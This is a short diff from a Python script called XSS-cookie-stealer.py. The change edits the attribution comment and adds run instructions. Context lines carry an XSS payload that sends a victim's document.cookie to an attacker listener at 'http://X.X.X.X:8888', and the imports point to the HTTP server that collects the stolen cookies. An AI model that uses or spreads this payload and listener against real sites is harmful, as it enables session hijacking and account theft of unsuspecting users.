@@ -6,7 +6,11 @@
 #   image.src='http://X.X.X.X:8888/?'+document.cookie;
 # </script>
 
-# Written by Ahmed Shawky @lnxg33k (The original version is deprecated. I fixed it - CyberLola)
+# Written by Ahmed Shawky @lnxg33k 
+#--------------------------------------------------------
+# The original version is deprecated. I fixed it - CyberLola
+# Run command: python XSS-cookie-stealer.py
+# Minimum output: Started http server
 
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import urlparse, parse_qs
